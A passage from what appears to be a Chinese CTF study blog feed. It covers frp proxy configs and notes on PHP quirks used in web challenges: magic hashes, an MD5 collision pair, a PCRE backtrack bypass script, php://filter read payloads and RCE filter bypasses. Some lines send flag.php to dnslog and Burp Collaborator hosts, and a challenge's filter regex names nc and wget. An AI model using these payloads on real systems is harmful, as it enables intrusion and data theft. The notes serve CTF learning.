<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.1.2</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>

<p>客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.0.2</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 192.168.1.2</span><br><span class="line">local_port = 10809</span><br><span class="line">remote_port = 10808</span><br></pre></td></tr></table></figure>
</li>
<li><p>FTP服务器：</p>
<p>客户端：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.2</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10809</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 特性</title>
    <url>/2023/09/26/Web/php%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><ul>
<li><p>intval</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;10&#x27;</span>));		<span class="comment">// int(10)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;aadd&#x27;</span>));	<span class="comment">// int(0)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;10aadd&#x27;</span>));	<span class="comment">// 10</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0e123&#x27;</span>));	<span class="comment">// int(0)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]));	<span class="comment">// int(1)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>([]));		<span class="comment">// int(0)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;0x10&#x27;</span>, <span class="number">0</span>));	<span class="comment">// int(16)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;10&#x27;</span>, <span class="number">0</span>));		<span class="comment">// int(10)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;10.0&#x27;</span>, <span class="number">0</span>));	<span class="comment">// int(10)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;010&#x27;</span>, <span class="number">0</span>));		<span class="comment">// int(8)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27; 010&#x27;</span>, <span class="number">0</span>));	<span class="comment">// int(8)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;+010&#x27;</span>, <span class="number">0</span>));	<span class="comment">// int(8)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<span id="more"></span>

<ul>
<li><p>preg_match</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="string">&quot;php\nphp&quot;</span>));	<span class="comment">// int(0)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="string">&quot;php\nphp&quot;</span>));	<span class="comment">// int(1)</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.w3schools.cn/php/php_regex.asp">PHP 正则表达式 (w3schools.cn)</a></p>
</blockquote>
<p>关于PHP利用PCRE回溯次数限制绕过某些安全限制，当存在<code>.+?</code>或者是<code>.*?</code>非贪婪匹配的时候，会优先匹配后面的字符，如果匹配不成功会进行回溯。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));		<span class="comment">// 1000000</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0bf200ce-da3a-4662-a0c1-8bdc290a1607.challenge.ctf.show/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;f&quot;</span> : <span class="string">&quot;very&quot;</span> * <span class="number">250000</span> + <span class="string">&quot;36Dctfshow&quot;</span>&#125;</span><br><span class="line">req = requests.<span class="title function_ invoke__">post</span>(url=url, data=data)</span><br><span class="line"><span class="keyword">print</span>(req.text)</span><br></pre></td></tr></table></figure>
</li>
<li><p>md5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 弱比较</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>])&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;aabC9RqS&#x27;</span>));		<span class="comment">// 0e041022518165728065344349536299</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;aabC9RqS&#x27;</span>) == <span class="string">&#x27;0&#x27;</span>);		<span class="comment">// bool(true)</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;aabC9RqS&#x27;</span>) == <span class="number">0</span>);		<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aabC9RqS</span><br><span class="line">aabg7XSs</span><br><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 强比较</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) !== <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>])&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>([<span class="number">1</span>, <span class="number">2</span>]));		<span class="comment">// NULL</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 强碰撞</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) !== (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>])&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// x=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;y=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>in_array</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;php&#x27;</span> == <span class="number">0</span>);		<span class="comment">// bool(true)</span></span><br><span class="line"><span class="variable">$x</span> = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">in_array</span>(<span class="string">&#x27;0.php&#x27;</span>, <span class="variable">$x</span>));	<span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>hex2bin</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将传入的十六进制转化为字符串</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;pursue&quot;</span>));		<span class="comment">// &quot;707572737565&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;pursue&quot;</span>)));		<span class="comment">// &quot;pursue&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>sha1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>([<span class="number">1</span>,<span class="number">2</span> ]));		<span class="comment">// NULL</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>parse_str</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&#x27;x=1&amp;y=2&#x27;</span>, <span class="variable">$tmp</span>);</span><br><span class="line"><span class="comment">// parse_str(&#x27;x=1,y=2&#x27;, $tmp);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$tmp</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [&quot;x&quot;]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [&quot;y&quot;]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="string">&quot;test[x]=test_x&amp;test[y]=test_y&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">	&#x27;x&#x27; =&gt; </span><br><span class="line">	string(6) &quot;test_x&quot;</span><br><span class="line">    &#x27;y&#x27; =&gt;</span><br><span class="line">    string(6) &quot;test_y&quot; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</li>
<li><p>ereg</p>
<p>已经被弃用了，可以使用空字符<code>%00</code>进行截断。</p>
</li>
<li><p>FilesystemIterator &amp; getcwd</p>
<p>获取当前目录下的所有文件名：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());		<span class="comment">// 返回一个迭代器</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">valid</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">getFilename</span>();</span><br><span class="line">    <span class="comment">// echo $iterator;</span></span><br><span class="line">    <span class="variable">$iterator</span>-&gt;<span class="title function_ invoke__">next</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>assert</p>
<p>和eval的功能差不多，但是没有语句结束分号的严格限制。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo()&quot;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>get_defined_vars</p>
<p>返回由所有已定义变量所组成的数组，包含调用get_defined_vars作用域内所有已定义的变量、环境变量、服务器变量、用户定义变量列表。</p>
</li>
<li><p>gettext</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="string">&quot;hello world&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;hello world\n&quot;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>注意需要开启gettext扩展</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;get_defined_vars&quot;</span>);	<span class="comment">// _(&quot;get_defined_vars&quot;) -&gt; &quot;get_defined_vars&quot;</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;get_defined_vars&quot;</span>));	<span class="comment">// get_defined_vars()</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>call_user_func</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="string">&quot;This is a test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ary</span> = [<span class="string">&quot;Test&quot;</span>, <span class="string">&quot;showinfo&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ary</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>shell_exec &amp; &#96;</p>
<p>无回显的命令执行，等同于用反引号进行执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ls -al&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;`ls -al`&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;curl `cat flag.php | grep &quot;flag&quot;`.ujw3w8.dnslog.cn</span><br><span class="line">?F=`$F` ;curl -X POST -F xx=@flag.php http://8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net	// burp</span><br><span class="line">?F=`$F` ;cp flag.php 1.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>create_function</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$my_func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#125;echo &quot;test&quot;;/*&#x27;</span>);</span><br><span class="line">/<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#125;echo &quot;test&quot;;/*&#x27;</span>);		<span class="comment">// 绝对路径</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_func</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;<span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php		// 两位一反转</span><br><span class="line">compress.zlib://flag.php</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode|deadbeef/resource=flag.php</span><br><span class="line">php://filter/|deadbeef/resource=flag.php</span><br><span class="line"></span><br><span class="line">php://filter/write=convert.base64-decode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h2 id="php反射"><a href="#php反射" class="headerlink" title="php反射"></a>php反射</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">my_test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$x</span> = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">k</span> = <span class="string">&quot;const&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">my_function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;this is a test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&quot;my_test&quot;</span>);</span><br><span class="line"><span class="variable">$methods</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getMethods</span>();</span><br><span class="line"><span class="variable">$props</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getProperties</span>();</span><br><span class="line"><span class="variable">$consts</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getConstants</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$reflection</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$methods</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$props</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$consts</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $reflection = new ReflectionClass(&quot;my_test&quot;);</span></span><br><span class="line">Class [ &lt;user&gt; <span class="class"><span class="keyword">class</span> <span class="title">my_test</span> ] </span>&#123;</span><br><span class="line">  @@ D:\phpstudy_pro\WWW\test.php <span class="number">3</span>-<span class="number">11</span></span><br><span class="line"></span><br><span class="line">  - Constants [<span class="number">1</span>] &#123;</span><br><span class="line">    Constant [ <span class="keyword">public</span> <span class="keyword">string</span> k ] &#123; <span class="keyword">const</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Static properties [<span class="number">0</span>] &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Static methods [<span class="number">0</span>] &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Properties [<span class="number">2</span>] &#123;</span><br><span class="line">    Property [ <span class="keyword">private</span> <span class="variable">$x</span> = <span class="number">100</span> ]</span><br><span class="line">    Property [ <span class="keyword">public</span> <span class="variable">$y</span> = <span class="string">&#x27;test&#x27;</span> ]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  - Methods [<span class="number">1</span>] &#123;</span><br><span class="line">    Method [ &lt;user&gt; <span class="keyword">public</span> method my_function ] &#123;</span><br><span class="line">      @@ D:\phpstudy_pro\WWW\test.php <span class="number">8</span> - <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $methods = $reflection-&gt;getMethods();</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;my_function&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;my_test&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $props = $reflection-&gt;getProperties();</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionProperty)<span class="comment">#3 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;x&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;my_test&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionProperty)<span class="comment">#4 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;y&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;my_test&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $consts = $reflection-&gt;getConstants();</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;k&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;const&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php">反射在 PHP 中的应用 | Laravel China 社区 (learnku.com)</a></p>
</blockquote>
<h2 id="php全局"><a href="#php全局" class="headerlink" title="php全局"></a>php全局</h2><ul>
<li><p>$GLOBALS：以数组的形式引用全局作用域中可用的全部变量。</p>
</li>
<li><p>$_SERVER</p>
<ul>
<li><p>在命令行的模式下，<code>$_SERVER[&#39;argv&#39;]</code>表示命令行参数，<code>$_SERVER[&#39;argv&#39;][0]</code>表示脚本名。</p>
</li>
<li><p>在web网页模式下，<strong>当 register_argc_argv 扩展项开启的时候</strong>，<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>，也就是GET方式传入的字符串。</p>
<blockquote>
<p><a href="https://www.cnblogs.com/luomir/p/5129875.html">详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别</a></p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h2 id="rce绕过"><a href="#rce绕过" class="headerlink" title="rce绕过"></a>rce绕过</h2><p><strong>注意GET和POST传入时由于编码不同，而导致GET可以成功，POST不能成功</strong>。</p>
<blockquote>
<p><a href="https://zhuanlan.zhihu.com/p/391439312">命令执行(RCE)面对各种过滤，骚姿势绕过总结</a></p>
</blockquote>
<ul>
<li><p>命令绕过</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tee f1 f2		# cp f1 f2</span><br><span class="line">ls \ | tee 1.txt</span><br><span class="line">nl 1.txt</span><br><span class="line">tac 1.txt		# 反向显示文件内容</span><br><span class="line">cat flag | awk NR==1 | cut -c 1		# 查看第一行的第一个字符</span><br></pre></td></tr></table></figure>
</li>
<li><p>取反绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;dir&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$func</span>) . <span class="string">&quot;\n&quot;</span>;		<span class="comment">// %8C%86%8C%8B%9A%92</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>) . <span class="string">&quot;\n&quot;</span>;		<span class="comment">// %9B%96%8D</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&quot;(~&quot;</span> . <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$func</span>) . <span class="string">&quot;)(~&quot;</span> . <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>) . <span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$x</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>异或绕过</p>
<p>拿师傅们的脚本改了一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;cat flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$func_ary</span> = [];</span><br><span class="line"><span class="variable">$func_idx</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span 